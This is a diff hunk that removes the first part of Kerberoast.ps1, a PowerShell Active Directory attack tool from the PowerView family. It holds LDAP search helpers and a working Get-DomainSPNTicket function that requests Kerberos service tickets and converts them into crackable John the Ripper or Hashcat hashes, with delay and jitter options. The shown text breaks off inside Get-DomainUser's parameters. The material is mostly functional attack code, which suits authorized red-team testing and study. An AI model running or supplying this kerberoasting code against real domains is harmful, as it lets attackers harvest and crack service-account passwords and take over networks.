@@ -1,1165 +1,1003 @@
-<#
-
-Kerberoast.ps1
-Author: Will Schroeder (@harmj0y)
-License: BSD 3-Clause
-Required Dependencies: None
-
-Note: the primary method of use will be Invoke-Kerberoast with
-various targeting options.
-
-#>
-
-function Get-DomainSearcher {
-<#
-.SYNOPSIS
-Helper used by various functions that builds a custom AD searcher object.
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Domain  
-.DESCRIPTION
-Takes a given domain and a number of customizations and returns a
-System.DirectoryServices.DirectorySearcher object. This function is used
-heavily by other LDAP/ADSI searcher functions (Verb-Domain*).
-.PARAMETER Domain
-Specifies the domain to use for the query, defaults to the current domain.
-.PARAMETER LDAPFilter
-Specifies an LDAP query string that is used to filter Active Directory objects.
-.PARAMETER Properties
-Specifies the properties of the output object to retrieve from the server.
-.PARAMETER SearchBase
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-.PARAMETER SearchBasePrefix
-Specifies a prefix for the LDAP search string (i.e. "CN=Sites,CN=Configuration").
-.PARAMETER Server
-Specifies an Active Directory server (domain controller) to bind to for the search.
-.PARAMETER SearchScope
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-.PARAMETER ResultPageSize
-Specifies the PageSize to set for the LDAP searcher object.
-.PARAMETER ResultPageSize
-Specifies the PageSize to set for the LDAP searcher object.
-.PARAMETER ServerTimeLimit
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-.PARAMETER SecurityMasks
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-.PARAMETER Tombstone
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-.PARAMETER Credential
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-.EXAMPLE
-Get-DomainSearcher -Domain testlab.local
-Return a searcher for all objects in testlab.local.
-.EXAMPLE
-Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'
-Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties.
-.EXAMPLE
-Get-DomainSearcher -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"
-Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).
-.OUTPUTS
-System.DirectoryServices.DirectorySearcher
-#>
-
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('System.DirectoryServices.DirectorySearcher')]
-    [CmdletBinding()]
-    Param(
-        [Parameter(ValueFromPipeline = $True)]
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $Domain,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('Filter')]
-        [String]
-        $LDAPFilter,
-
-        [ValidateNotNullOrEmpty()]
-        [String[]]
-        $Properties,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('ADSPath')]
-        [String]
-        $SearchBase,
-
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $SearchBasePrefix,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('DomainController')]
-        [String]
-        $Server,
-
-        [ValidateSet('Base', 'OneLevel', 'Subtree')]
-        [String]
-        $SearchScope = 'Subtree',
-
-        [ValidateRange(1, 10000)]
-        [Int]
-        $ResultPageSize = 200,
-
-        [ValidateRange(1, 10000)]
-        [Int]
-        $ServerTimeLimit = 120,
-
-        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
-        [String]
-        $SecurityMasks,
-
-        [Switch]
-        $Tombstone,
-
-        [Management.Automation.PSCredential]
-        [Management.Automation.CredentialAttribute()]
-        $Credential = [Management.Automation.PSCredential]::Empty
-    )
-
-    PROCESS {
-        if ($PSBoundParameters['Domain']) {
-            $TargetDomain = $Domain
-        }
-        else {
-            # if not -Domain is specified, retrieve the current domain name
-            if ($PSBoundParameters['Credential']) {
-                $DomainObject = Get-Domain -Credential $Credential
-            }
-            else {
-                $DomainObject = Get-Domain
-            }
-            $TargetDomain = $DomainObject.Name
-        }
-
-        if (-not $PSBoundParameters['Server']) {
-            # if there's not a specified server to bind to, try to pull the current domain PDC
-            try {
-                if ($DomainObject) {
-                    $BindServer = $DomainObject.PdcRoleOwner.Name
-                }
-                elseif ($PSBoundParameters['Credential']) {
-                    $BindServer = ((Get-Domain -Credential $Credential).PdcRoleOwner).Name
-                }
-                else {
-                    $BindServer = ((Get-Domain).PdcRoleOwner).Name
-                }
-            }
-            catch {
-                throw "[Get-DomainSearcher] Error in retrieving PDC for current domain: $_"
-            }
-        }
-        else {
-            $BindServer = $Server
-        }
-
-        $SearchString = 'LDAP://'
-
-        if ($BindServer -and ($BindServer.Trim() -ne '')) {
-            $SearchString += $BindServer
-            if ($TargetDomain) {
-                $SearchString += '/'
-            }
-        }
-
-        if ($PSBoundParameters['SearchBasePrefix']) {
-            $SearchString += $SearchBasePrefix + ','
-        }
-
-        if ($PSBoundParameters['SearchBase']) {
-            if ($SearchBase -Match '^GC://') {
-                # if we're searching the global catalog, get the path in the right format
-                $DN = $SearchBase.ToUpper().Trim('/')
-                $SearchString = ''
-            }
-            else {
-                if ($SearchBase -match '^LDAP://') {
-                    if ($SearchBase -match "LDAP://.+/.+") {
-                        $SearchString = ''
-                        $DN = $SearchBase
-                    }
-                    else {
-                        $DN = $SearchBase.SubString(7)
-                    }
-                }
-                else {
-                    $DN = $SearchBase
-                }
-            }
-        }
-        else {
-            # transform the target domain name into a distinguishedName if an ADS search base is not specified
-            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
-                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
-            }
-        }
-
-        $SearchString += $DN
-        Write-Verbose "[Get-DomainSearcher] search string: $SearchString"
-
-        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
-            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
-            # bind to the inital search object using alternate credentials
-            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
-            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
-        }
-        else {
-            # bind to the inital object using the current credentials
-            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
-        }
-
-        $Searcher.PageSize = $ResultPageSize
-        $Searcher.SearchScope = $SearchScope
-        $Searcher.CacheResults = $False
-        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
-
-        if ($PSBoundParameters['ServerTimeLimit']) {
-            $Searcher.ServerTimeLimit = $ServerTimeLimit
-        }
-
-        if ($PSBoundParameters['Tombstone']) {
-            $Searcher.Tombstone = $True
-        }
-
-        if ($PSBoundParameters['LDAPFilter']) {
-            $Searcher.filter = $LDAPFilter
-        }
-
-        if ($PSBoundParameters['SecurityMasks']) {
-            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
-                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
-                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
-                'None' { [System.DirectoryServices.SecurityMasks]::None }
-                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
-                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
-            }
-        }
-
-        if ($PSBoundParameters['Properties']) {
-            # handle an array of properties to load w/ the possibility of comma-separated strings
-            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
-            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
-        }
-
-        $Searcher
-    }
-}
-
-
-function Convert-LDAPProperty {
-<#
-.SYNOPSIS
-Helper that converts specific LDAP property result fields and outputs
-a custom psobject.
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-.DESCRIPTION
-Converts a set of raw LDAP properties results from ADSI/LDAP searches
-into a proper PSObject. Used by several of the Get-Domain* function.
-.PARAMETER Properties
-Properties object to extract out LDAP fields for display.
-.OUTPUTS
-System.Management.Automation.PSCustomObject
-A custom PSObject with LDAP hashtable properties translated.
-#>
-
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('System.Management.Automation.PSCustomObject')]
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
-        [ValidateNotNullOrEmpty()]
-        $Properties
-    )
-
-    $ObjectProperties = @{}
-
-    $Properties.PropertyNames | ForEach-Object {
-        if ($_ -ne 'adspath') {
-            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
-                # convert all listed sids (i.e. if multiple are listed in sidHistory)
-                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
-            }
-            elseif ($_ -eq 'grouptype') {
-                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
-            }
-            elseif ($_ -eq 'samaccounttype') {
-                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
-            }
-            elseif ($_ -eq 'objectguid') {
-                # convert the GUID to a string
-                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
-            }
-            elseif ($_ -eq 'useraccountcontrol') {
-                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
-            }
-            elseif ($_ -eq 'ntsecuritydescriptor') {
-                # $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
-                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
-                if ($Descriptor.Owner) {
-                    $ObjectProperties['Owner'] = $Descriptor.Owner
-                }
-                if ($Descriptor.Group) {
-                    $ObjectProperties['Group'] = $Descriptor.Group
-                }
-                if ($Descriptor.DiscretionaryAcl) {
-                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
-                }
-                if ($Descriptor.SystemAcl) {
-                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
-                }
-            }
-            elseif ($_ -eq 'accountexpires') {
-                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
-                    $ObjectProperties[$_] = "NEVER"
-                }
-                else {
-                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
-                }
-            }
-            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
-                # convert timestamps
-                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
-                    # if we have a System.__ComObject
-                    $Temp = $Properties[$_][0]
-                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
-                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
-                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
-                }
-                else {
-                    # otherwise just a string
-                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
-                }
-            }
-            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
-                # try to convert misc com objects
-                $Prop = $Properties[$_]
-                try {
-                    $Temp = $Prop[$_][0]
-                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
-                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
-                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
-                }
-                catch {
-                    Write-Verbose "[Convert-LDAPProperty] error: $_"
-                    $ObjectProperties[$_] = $Prop[$_]
-                }
-            }
-            elseif ($Properties[$_].count -eq 1) {
-                $ObjectProperties[$_] = $Properties[$_][0]
-            }
-            else {
-                $ObjectProperties[$_] = $Properties[$_]
-            }
-        }
-    }
-    try {
-        New-Object -TypeName PSObject -Property $ObjectProperties
-    }
-    catch {
-        Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
-    }
-}
-
-
-function Get-Domain {
-<#
-.SYNOPSIS
-Returns the domain object for the current (or specified) domain.
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: None  
-.DESCRIPTION
-Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
-domain or the domain specified with -Domain X.
-.PARAMETER Domain
-Specifies the domain name to query for, defaults to the current domain.
-.PARAMETER Credential
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-.EXAMPLE
-Get-Domain -Domain testlab.local
-.EXAMPLE
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-Domain -Credential $Cred
-.OUTPUTS
-System.DirectoryServices.ActiveDirectory.Domain
-A complex .NET domain object.
-.LINK
-http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
-#>
-
-    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
-    [CmdletBinding()]
-    Param(
-        [Parameter(Position = 0, ValueFromPipeline = $True)]
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $Domain,
-
-        [Management.Automation.PSCredential]
-        [Management.Automation.CredentialAttribute()]
-        $Credential = [Management.Automation.PSCredential]::Empty
-    )
-
-    PROCESS {
-        if ($PSBoundParameters['Credential']) {
-
-            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'
-
-            if ($PSBoundParameters['Domain']) {
-                $TargetDomain = $Domain
-            }
-            else {
-                # if no domain is supplied, extract the logon domain from the PSCredential passed
-                $TargetDomain = $Credential.GetNetworkCredential().Domain
-                Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
-            }
-
-            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
-
-            try {
-                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
-            }
-            catch {
-                Write-Verbose "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
-            }
-        }
-        elseif ($PSBoundParameters['Domain']) {
-            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
-            try {
-                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
-            }
-            catch {
-                Write-Verbose "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
-            }
-        }
-        else {
-            try {
-                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-            }
-            catch {
-                Write-Verbose "[Get-Domain] Error retrieving the current domain: $_"
-            }
-        }
-    }
-}
-
-
-
-function Get-DomainSPNTicket {
-<#
-.SYNOPSIS
-
-Request the kerberos ticket for a specified service principal name (SPN).
-
-Author: machosec, Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf  
-
-.DESCRIPTION
-
-This function will either take one/more SPN strings, or one/more PowerView.User objects
-(the output from Get-DomainUser) and will request a kerberos ticket for the given SPN
-using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
-portion of the ticket is then extracted and output in either crackable John or Hashcat
-format (deafult of John).
-
-.PARAMETER SPN
-
-Specifies the service principal name to request the ticket for.
-
-.PARAMETER User
-
-Specifies a PowerView.User object (result of Get-DomainUser) to request the ticket for.
-
-.PARAMETER OutputFormat
-
-Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
-Defaults to 'John'.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the remote domain using Invoke-UserImpersonation.
-
-.PARAMETER Delay
-
-Specifies the delay in seconds between ticket requests.
-
-.PARAMETER Jitter
-
-Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
-
-.EXAMPLE
-
-Get-DomainSPNTicket -SPN "HTTP/web.testlab.local"
-
-Request a kerberos service ticket for the specified SPN.
-
-.EXAMPLE
-
-"HTTP/web1.testlab.local","HTTP/web2.testlab.local" | Get-DomainSPNTicket
-
-Request kerberos service tickets for all SPNs passed on the pipeline.
-
-.EXAMPLE
-
-Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
-
-Request kerberos service tickets for all users with non-null SPNs and output in Hashcat format.
-
-.INPUTS
-
-String
-
-Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.
-
-.INPUTS
-
-PowerView.User
-
-Accepts one or more PowerView.User objects on the pipeline with the User parameter set.
-
-.OUTPUTS
-
-PowerView.SPNTicket
-
-Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
-#>
-
-    [OutputType('PowerView.SPNTicket')]
-    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
-    Param (
-        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
-        [ValidatePattern('.*/.*')]
-        [Alias('ServicePrincipalName')]
-        [String[]]
-        $SPN,
-
-        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
-        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
-        [Object[]]
-        $User,
-
-        [ValidateSet('John', 'Hashcat')]
-        [Alias('Format')]
-        [String]
-        $OutputFormat = 'John',
-
-        [ValidateRange(0,10000)]
-        [Int]
-        $Delay = 0,
-
-        [ValidateRange(0.0, 1.0)]
-        [Double]
-        $Jitter = .3,
-
-        [Management.Automation.PSCredential]
-        [Management.Automation.CredentialAttribute()]
-        $Credential = [Management.Automation.PSCredential]::Empty
-    )
-
-    BEGIN {
-        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
-
-        if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
-        }
-    }
-
-    PROCESS {
-        if ($PSBoundParameters['User']) {
-            $TargetObject = $User
-        }
-        else {
-            $TargetObject = $SPN
-        }
-	
-	$RandNo = New-Object System.Random
-
-        ForEach ($Object in $TargetObject) {
-
-            if ($PSBoundParameters['User']) {
-                $UserSPN = $Object.ServicePrincipalName
-                $SamAccountName = $Object.SamAccountName
-                $DistinguishedName = $Object.DistinguishedName
-            }
-            else {
-                $UserSPN = $Object
-                $SamAccountName = 'UNKNOWN'
-                $DistinguishedName = 'UNKNOWN'
-            }
-
-            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
-            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
-                $UserSPN = $UserSPN[0]
-            }
-
-            try {
-                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
-            }
-            catch {
-                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
-            }
-            if ($Ticket) {
-                $TicketByteStream = $Ticket.GetRequest()
-            }
-            if ($TicketByteStream) {
-                $Out = New-Object PSObject
-
-                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
-
-                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
-                # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
-                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
-                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
-                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
-                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
-
-                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
-                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
-                        Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
-                        $Hash = $null
-                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
-                    } else {
-                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
-                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
-                    }
-                } else {
-                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
-                    $Hash = $null
-                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
-                }
-
-                if($Hash) {
-                    if ($OutputFormat -match 'John') {
-                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
-                    }
-                    else {
-                        if ($DistinguishedName -ne 'UNKNOWN') {
-                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        }
-                        else {
-                            $UserDomain = 'UNKNOWN'
-                        }
-
-                        # hashcat output format
-                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
-                    }
-                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
-                }
-
-                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
-                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
-                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
-                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
-                Write-Output $Out
-            }
-            # sleep for our semi-randomized interval
-            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
-        }
-    }
-
-    END {
-        if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
-        }
-    }
-}
-
-function Get-DomainUser {
-<#
-.SYNOPSIS
-Return all users or specific user objects in AD.
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Convert-ADName, Convert-LDAPProperty  
-.DESCRIPTION
-Builds a directory searcher object using Get-DomainSearcher, builds a custom
-LDAP filter based on targeting/filter parameters, and searches for all objects
-matching the criteria. To only return specific properties, use
-"-Properties samaccountname,usnchanged,...". By default, all user objects for
-the current domain are returned.
-.PARAMETER Identity
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
-Wildcards accepted. Also accepts DOMAIN\user format.
-.PARAMETER SPN
-Switch. Only return user objects with non-null service principal names.
-.PARAMETER UACFilter
-Dynamic parameter that accepts one or more values from $UACEnum, including
-"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.
-.PARAMETER AdminCount
-Switch. Return users with '(adminCount=1)' (meaning are/were privileged).
-.PARAMETER AllowDelegation
-Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'
-.PARAMETER DisallowDelegation
-Switch. Return user accounts that are marked as 'sensitive and not allowed for delegation'
-.PARAMETER TrustedToAuth
-Switch. Return computer objects that are trusted to authenticate for other principals.
-.PARAMETER PreauthNotRequired
-Switch. Return user accounts with "Do not require Kerberos preauthentication" set.
-.PARAMETER Domain
-Specifies the domain to use for the query, defaults to the current domain.
-.PARAMETER LDAPFilter
-Specifies an LDAP query string that is used to filter Active Directory objects.
-.PARAMETER Properties
-Specifies the properties of the output object to retrieve from the server.
-.PARAMETER SearchBase
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-.PARAMETER Server
-Specifies an Active Directory server (domain controller) to bind to.
-.PARAMETER SearchScope
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-.PARAMETER ResultPageSize
-Specifies the PageSize to set for the LDAP searcher object.
-.PARAMETER ServerTimeLimit
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-.PARAMETER SecurityMasks
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-.PARAMETER Tombstone
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-.PARAMETER FindOne
-Only return one result object.
-.PARAMETER Credential
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-.PARAMETER Raw
-Switch. Return raw results instead of translating the fields into a custom PSObject.
-.EXAMPLE
-Get-DomainUser -Domain testlab.local
-Return all users for the testlab.local domain
-.EXAMPLE
-Get-DomainUser "S-1-5-21-890171859-3433809279-3366196753-1108","administrator"
-Return the user with the given SID, as well as Administrator.
-.EXAMPLE
-'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff
-lastlogoff                                   samaccountname
-----------                                   --------------
-12/31/1600 4:00:00 PM                        dfm.a
-12/31/1600 4:00:00 PM                        dfm
-12/31/1600 4:00:00 PM                        harmj0y
-12/31/1600 4:00:00 PM                        Administrator
-.EXAMPLE
-Get-DomainUser -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -AdminCount -AllowDelegation
-Search the specified OU for privileged user (AdminCount = 1) that allow delegation
-.EXAMPLE
-Get-DomainUser -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon
-Search for users with a primary group ID other than 513 ('domain users') and only return samaccountname and lastlogon
-.EXAMPLE
-Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED
-Find users who doesn't require Kerberos preauthentication and DON'T have an expired password.
-.EXAMPLE
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainUser -Credential $Cred
-.EXAMPLE
-Get-Domain | Select-Object -Expand name
-testlab.local
-Get-DomainUser dev\user1 -Verbose -Properties distinguishedname
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
-VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=user1)))
-distinguishedname
------------------
-CN=user1,CN=Users,DC=dev,DC=testlab,DC=local
-.INPUTS
-String
-.OUTPUTS
-PowerView.User
-Custom PSObject with translated user property fields.
-PowerView.User.Raw
-The raw DirectoryServices.SearchResult object, if -Raw is enabled.
-#>
-
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerView.User')]
-    [OutputType('PowerView.User.Raw')]
-    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
-    Param(
-        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
-        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
-        [String[]]
-        $Identity,
-
-        [Switch]
-        $SPN,
-
-        [Switch]
-        $AdminCount,
-
-        [Parameter(ParameterSetName = 'AllowDelegation')]
-        [Switch]
-        $AllowDelegation,
-
-        [Parameter(ParameterSetName = 'DisallowDelegation')]
-        [Switch]
-        $DisallowDelegation,
-
-        [Switch]
-        $TrustedToAuth,
-
-        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
-        [Switch]
-        $PreauthNotRequired,
-
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $Domain,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('Filter')]
-        [String]
-        $LDAPFilter,
-
-        [ValidateNotNullOrEmpty()]
-        [String[]]
-        $Properties,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('ADSPath')]
-        [String]
-        $SearchBase,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('DomainController')]
-        [String]
-        $Server,
-
-        [ValidateSet('Base', 'OneLevel', 'Subtree')]
-        [String]
-        $SearchScope = 'Subtree',
-
-        [ValidateRange(1, 10000)]
-        [Int]
-        $ResultPageSize = 200,
-
-        [ValidateRange(1, 10000)]
-        [Int]
-        $ServerTimeLimit,
-
-        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
-        [String]
-        $SecurityMasks,
-
-        [Switch]
-        $Tombstone,
-
-        [Alias('ReturnOne')]
-        [Switch]
-        $FindOne,
-
-        [Management.Automation.PSCredential]
-        [Management.Automation.CredentialAttribute()]
-        $Credential = [Management.Automation.PSCredential]::Empty,
-
-        [Switch]
-        $Raw
-    )
-<#
-    DynamicParam {
-        $UACValueNames = [Enum]::GetNames($UACEnum)
-        # add in the negations
-        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
-        # create new dynamic parameter
-        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
-    }
-#>
